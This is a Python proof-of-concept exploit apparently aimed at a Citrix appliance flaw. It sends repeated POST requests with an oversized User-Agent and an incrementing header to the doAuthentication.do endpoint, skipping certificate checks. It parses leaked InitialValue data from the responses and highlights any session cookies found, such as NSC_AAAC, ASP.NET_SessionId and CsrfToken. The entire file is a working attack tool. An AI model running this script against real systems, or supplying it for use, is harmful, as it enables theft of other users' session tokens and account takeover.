import requests
import re
import argparse
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser(description="Citrix InitialValue PoC with random header brute-force.")
    parser.add_argument("host", help="Target Citrix host, e.g., https://citrix.example.com")
    parser.add_argument("count", type=int, help="Number of random values to try (starting from 1)")
    args = parser.parse_args()

    url = args.host.rstrip("/") + "/p/u/doAuthentication.do"
    data = "login"
    user_agent = "owaysX" * 100

    print(f"[*] Target: {url}")
    print(f"[*] Trying {args.count} requests\n")

    for i in range(1, args.count + 1):
        headers = {
            "User-Agent": user_agent,
            "random": str(i),
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(data)),
            "Connection": "keep-alive",
            "Host": requests.utils.urlparse(args.host).hostname
        }

        try:
            resp = requests.post(url, headers=headers, data=data, timeout=10, verify=False)
        except Exception as e:
            print(f"[!] Request failed for random {i}: {e}")
            continue

        match = re.search(r"<InitialValue>(.*?)</InitialValue>", resp.text, re.DOTALL)
        if match:
            value = match.group(1).strip()
            print(f"======== random {i} ========:")
            # ASP.NET_SessionId, CsrfToken, NSC_AAAC
            if "_Session" in value or "NSC_AAAC" in value or "CsrfToken" in value or "Set-Cookie:" in value or "Cookie:" in value:
                print(f"\033[92m[+] Cookie found:\n{value}\033[0m\n")  # Green text
            else:
                print(f"{value}\n")

if __name__ == "__main__":
    main()
